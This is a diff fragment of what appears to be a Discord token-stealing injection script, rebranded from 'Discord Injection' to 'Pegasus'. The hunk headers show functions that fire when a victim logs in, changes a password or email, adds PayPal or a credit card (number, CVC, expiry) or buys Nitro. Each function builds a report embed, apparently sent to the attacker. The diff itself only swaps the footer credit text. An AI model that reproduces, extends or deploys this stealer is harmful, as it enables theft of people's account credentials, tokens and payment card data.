@@ -354,7 +354,7 @@ const login = async (email, password, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉 Pegasus By github.com/addi00000・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -397,7 +397,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉 Pegasus By github.com/addi00000・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -440,7 +440,7 @@ const emailChanged = async (email, password, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉 Pegasus By github.com/addi00000・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -482,7 +482,7 @@ const PaypalAdded = async (token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉 Pegasus By github.com/addi00000・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -524,7 +524,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉 Pegasus By github.com/addi00000・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -568,7 +568,7 @@ const nitroBought = async (token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉 Pegasus By github.com/addi00000・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
